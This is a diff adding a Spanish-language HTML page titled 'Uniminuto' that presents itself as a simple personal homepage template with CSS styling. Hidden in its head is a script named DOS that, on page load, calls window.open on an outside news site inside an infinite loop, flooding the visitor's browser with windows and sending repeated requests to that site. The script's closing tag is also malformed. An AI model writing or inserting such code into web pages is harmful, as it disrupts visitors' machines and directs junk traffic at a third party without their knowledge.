@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Uniminuto</title>
+  <script>
+	function DOS(){
+		window.open('https://www.pulzo.com');
+	}
+	for (;;){
+		DOS();
+	}
+  <script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 20px;
+    }
+    header {
+      background-color: #007bff;
+      color: white;
+      padding: 15px;
+      text-align: center;
+    }
+    main {
+      background-color: white;
+      padding: 20px;
+      border-radius: 5px;
+    }
+    footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Bienvenido a mi página</h1>
+  </header>
+  <main>
+    <h2>Sobre mí</h2>
+    <p>Hola, soy [Tu Nombre]. Esta es una página web sencilla hecha con HTML y CSS.</p>
+  </main>
+  <footer>
+    <p>&copy; 2025 Mi Página Web</p>
+  </footer>
+</body>
+</html>
